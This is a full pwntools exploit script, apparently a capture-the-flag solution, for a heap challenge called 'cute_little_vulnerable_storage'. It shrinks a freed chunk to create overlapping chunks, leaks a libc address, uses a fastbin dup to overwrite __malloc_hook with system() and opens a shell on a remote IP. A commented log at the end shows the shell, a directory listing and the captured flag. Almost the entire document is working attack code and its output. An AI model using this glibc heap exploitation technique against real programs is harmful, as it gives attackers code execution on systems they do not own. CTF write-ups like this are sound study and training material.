#!/usr/bin/env python3
from pwn import *
# import https://github.com/bash-c/slides/blob/master/pwn_heap/Glibc%20Adventures:%20The%20forgotten%20chunks.pdf
# import https://heap-exploitation.dhavalkapil.com/attacks/shrinking_free_chunks 
# import https://blog.csdn.net/qq_41453285/article/details/99321101

chall = context.binary = ELF('cute_little_vulnerable_storage')
libc  = ELF('./libc.so.6')


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([chall.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote('3.99.48.161', 9005)
    else:
        return process([chall.path] + argv, *a, **kw)

gdbscript = '''
# break main
# break *0x0000555555555246  
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

cursor = -1

def sendchoice(option: int):
    io.sendlineafter(b'5.Exit', str(option).encode())

#1
def malloc(size: int = 0x18): 
    global cursor 
    if (cursor>15):
        raise Exception('mem is full')
    
    sendchoice(1)
    io.sendlineafter(b'size:', str(size).encode())
    cursor+=1
    return cursor

#2
def free(idx: int):
    global cursor
    sendchoice(2)
    io.sendlineafter(b'index:', str(idx).encode())
#3
def edit(idx: int = 0, data: bytes = b'AAAABBBB'):
    sendchoice(3)
    io.sendlineafter(b'index:', str(idx).encode())
    io.sendlineafter(b'data:', data)
#4
def view(idx: int = 0):
    sendchoice(4)
    io.sendlineafter(b'index:', str(idx).encode())
    io.recvuntil(b'Here is your chunk contents')
    resp = io.recvuntil(b'Storage space created', drop=True)
    return resp


io = start()

# step 0 - initial chunks setup 
a = malloc(0x70-8)  # 0
b = malloc(0x210-8) # 1
c = malloc(0x100-8) # 2
d = malloc(0x30-8)  # 3, not used. this is just a barrier from the wilderness/heap 'top-chunk'

# for debugging purposes / easier hexdumps
edit(a, b'A'*(0x70-8-2))
edit(b, b'B'*(0x210-8-2))
edit(c, b'C'*(0x100-8-2)) 
edit(d, b'D'*(0x30-8-2)) 

# step 1 - pwn starts here 
free(b)
edit(a, b'A'*(0x70-8)) # corrupt free chunk 'b' size (now its 0x200 instead of 0x210)


b1 = malloc(0x100-8) # 4
b2 = malloc(0x70-8)  # 5

free(b1)
free(a)
free(c) # ptmalloc never updated C's prev_size, hence, consolidation will occur while b2 becomes a 'forgotten chunk'.
log.info("Consolidation triggered/chunks merged")


# step 2 - creating an overlapping big chunk that occupy the space of A, B and C and also overlaps B2
hax = malloc(0x1b0-8)  # 6
free(b2) # inserting the b2 chunk into the 0x70 fastbin, this is a prep for step 4


# step 3 - leaking libc pointers using the unsorted bin 
result = view(hax)
log.info(f'overlapping chunk result:: {result}')

arena_leak = u64(result[0x170:0x178])
libc_base = arena_leak - 0x397bd8
libc.address = libc_base
log.success(f'leaking <main_arena+216> :: {hex(arena_leak)}')
log.success(f'libc base :: {hex(libc_base)}')
log.success(f'__malloc_hook :: {hex(libc.sym.__malloc_hook)}')


# step 4 - crafting a fastbin-dup primitive
fastbin_dup  = b'Z'*(0x100-0x8)
fastbin_dup += p64(0x70) # size prefix
fastbin_dup += p64(libc.sym.__malloc_hook-0x23) # overcoming 'malloc(): memory corruption (fast)' error by spoofing size field of 0x7f 
edit(hax, fastbin_dup)


# step 5 - triggering the fastbin-dup primitive, applying write-what-where in order to replace __malloc_hook() with system() 
# pwndbg> bins
# fastbins
# 0x20: 0x0
# 0x30: 0x0
# 0x40: 0x0
# 0x50: 0x0
# 0x60: 0x0
# 0x70: 0x55555555b590 —▸ 0x7ffff7dd4af0 (__malloc_hook) ◂— 0x0
# 0x80: 0x0

tmpchunk = malloc(0x70-8)
fastbin_pwn = malloc(0x70-8)

payload  = b'Q'*(0x23-0x10) # filling the buffer until we hit the '__malloc_hook' addr
payload += p64(libc.sym.system) # replacing __malloc_hook with system()
edit(fastbin_pwn, payload)


malloc(next(libc.search(b'/bin/sh'))) # pop a shell :^)
io.interactive()

# output : 
# root@ef880cac39eb:~/host-share/pwn/vuln-storage# ./solve.py REMOTE
# [+] Opening connection to 3.99.48.161 on port 9005: Done
# [*] Consolidation triggered/chunks merged
# [*] overlapping chunk result:: b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x00\x01\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00\x00\xe0\xd7i\xf7U\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x91\x00\x00\x00\x00\x00\x00\x00\xd8+;E\x8e\x7f\x00\x00\xd8+;E\x8e\x7f\x00\x00BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
# [+] leaking <main_arena+216> :: 0x7f8e453b2bd8
# [+] libc base :: 0x7f8e4501b000
# [+] __malloc_hook :: 0x7f8e453b2af0
# [*] Switching to interactive mode
# 
# $ id
# uid=1000(pwn5) gid=1000(pwn5) groups=1000(pwn5)
# $ ls
# cute_little_vulnerable_storage
# flag.txt
# ld-2.25.so
# libc-2.25.so
# libc.so.6
# start.sh
# $ cat flag.txt
# TamilCTF{Th3_1n7en7eD_S0lu7i0N_W4S_70_Cr347e_0v3rl4PP1Ng_ChuNkS_bY_h0uSe_0f_3iNh3rj4r_M37h0d_0R_by_P0is0N_NuLL_By73S_4nD_7urN_7h47_70_F4S7BiN_DuP_70_C0D3_3x3cuTi0N}
